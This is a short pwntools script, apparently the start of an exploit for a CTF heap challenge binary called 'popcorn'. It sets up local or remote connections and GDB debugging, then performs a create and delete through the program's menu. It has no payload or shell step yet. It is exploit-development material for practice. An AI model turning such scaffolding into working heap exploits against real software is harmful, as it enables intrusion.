#!/usr/bin/python3

from pwn import *

exe = ELF('popcorn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*__libc_start_main+123

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def create():
        sla(b"> ", b"1")
        sa(b"> ", b"a" * 31)
def delete():
        sla(b"> ", b"4")
        sla(b"> ", b"2")
create()
delete()
p.interactive()
